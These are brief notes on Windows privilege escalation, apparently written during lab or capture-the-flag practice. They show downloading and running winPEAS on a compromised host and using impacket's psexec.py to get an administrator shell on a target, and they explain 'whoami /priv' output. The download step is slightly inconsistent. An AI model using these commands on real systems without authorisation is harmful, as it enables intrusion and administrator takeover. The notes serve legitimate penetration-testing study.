There are several tools that can help us escalate privileges on Windows machines.

- [winPEAS.exe](#wpeas)
- [psexec.py](#pspy)


# winPEAS.exe <a name="wpeas"></a>

winPEAS.exe is an executable that, once we have a reverse shell, will display files with possible critical information in red.

Example:

1. First, download it using PowerShell:
````bash
wget https://github.com/carlospolop/PEASS-ng/releases/tag/20231002-59c6f6e6
````
2.  Switch to PowerShell in your terminal: 
````bash
powershell
````
3. Finally, execute winPEAS.exe:
````bash
C:\Users\sql_svc\Downloads> .\winPEASx64.exe
````



# psexec.py <a name="pspy"></a>

- psexec.py is a tool from impacket that allows us to obtain a shell as an administrator.

````bash
python3 psexec.py administrator@{TARGET_IP}
````

# whoami
When you run `whoami /priv`, you will receive a list of the privileges assigned to your user account, along with their status (enabled or disabled). The output typically includes:

- **Privilege Name**: A brief description of each privilege.
- **State**: Indicates whether the privilege is enabled (Enabled) or disabled (Disabled).
### Example of Usage
```bash
whoami /priv
```
The output might look something like this:
```bash
PRIVILEGES INFORMATION
-----------------------
Privilege Name                    State
===========================================
SeShutdownPrivilege                Enabled
SeBackupPrivilege                  Enabled
SeRestorePrivilege                 Disabled
SeChangeNotifyPrivilege            Enabled
SeTakeOwnershipPrivilege           Enabled
```
